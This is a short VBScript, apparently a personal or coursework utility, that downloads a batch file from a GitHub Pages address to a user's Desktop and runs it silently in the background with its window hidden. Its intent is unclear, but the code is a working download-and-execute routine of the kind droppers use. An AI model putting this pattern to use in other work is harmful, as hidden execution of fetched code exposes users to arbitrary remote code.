Dim url, destination, objXMLHTTP, objADOStream, objFSO, objShell

' Set the URL of the batch script
url = "https://anasoyyo.github.io/ucases/script.bat"
destination = "C:\Users\sara.redondo\Desktop\UPC\UCASES\script.bat"  ' Save location

' Create objects
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.Open "GET", url, False
objXMLHTTP.Send

If objXMLHTTP.Status = 200 Then
    Set objADOStream = CreateObject("ADODB.Stream")
    objADOStream.Type = 1 ' Binary
    objADOStream.Open
    objADOStream.Write objXMLHTTP.ResponseBody
    objADOStream.SaveToFile destination, 2 ' Overwrite if exists
    objADOStream.Close
    Set objADOStream = Nothing
End If

Set objXMLHTTP = Nothing

' Execute the downloaded batch file
Set objShell = CreateObject("WScript.Shell")
objShell.Run destination, 0, False  ' Runs silently in the background
Set objShell = Nothing
